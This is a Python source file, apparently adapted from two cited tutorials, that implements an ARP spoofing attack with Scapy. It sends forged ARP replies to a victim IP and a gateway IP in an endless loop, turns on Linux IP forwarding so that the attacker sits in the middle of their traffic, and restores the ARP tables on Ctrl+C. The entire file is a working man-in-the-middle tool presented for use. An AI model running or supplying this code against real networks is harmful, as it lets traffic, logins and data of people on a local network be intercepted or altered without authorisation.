# https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
# https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy

import scapy.all as scapy
import time
import argparse
import time
import os
import sys

def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, host_ip, verbose=True):
    """
    Kali tells `target_ip` saying that "I have the host_ip that you want to talk". 
    However, Kali provides its own Mac address.
    In target's arp:
    Host IP, attacker's/Kali Mac address
    """
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
															psrc = host_ip)
    scapy.send(packet, verbose = False)
    
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = scapy.ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
	scapy.send(packet, verbose = False)
 
 
def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f) 
        
   
def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
        _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")
	
if __name__ == "__main__":
    # Get the command-line arguments
    args = sys.argv
    
    # victim ip address
    target = args[1]
    # gateway ip address
    host = args[2]
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    enable_ip_route()
    try:
        sent_packets_count = 0
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            # sleep for two second
            time.sleep(3)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
        print("[+] Arp Spoof Stopped")
